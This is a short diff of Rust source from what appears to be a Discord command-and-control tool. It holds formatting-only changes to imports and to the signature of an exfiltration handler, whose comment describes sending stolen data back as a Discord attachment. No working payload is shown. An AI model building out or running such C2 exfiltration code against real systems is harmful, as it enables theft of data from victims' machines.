@@ -5,11 +5,7 @@ use serenity::{
 		application::{
 			command::CommandOptionType,
 			interaction::{
-				application_command::{
-					ApplicationCommandInteraction,
-					CommandDataOption,
-					CommandDataOptionValue,
-				},
+				application_command::{ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue},
 				InteractionResponseType,
 			},
 		},
@@ -154,10 +150,7 @@ pub async fn run(options: &[CommandDataOption]) -> Option<AttachmentType> {
 /// options specified in the `command`. If the exfiltration is successful, this function responds to the interaction
 /// with a message indicating success and an attachment containing the exfiltrated data. If the exfiltration fails,
 /// this function responds to the interaction with a message indicating failure.
-pub async fn handle_exfiltrate(
-	ctx: &Context,
-	command: &ApplicationCommandInteraction,
-) -> Result<(), DiscordC2Error> {
+pub async fn handle_exfiltrate(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
 	let attachment = run(&command.data.options).await;
 
 	command
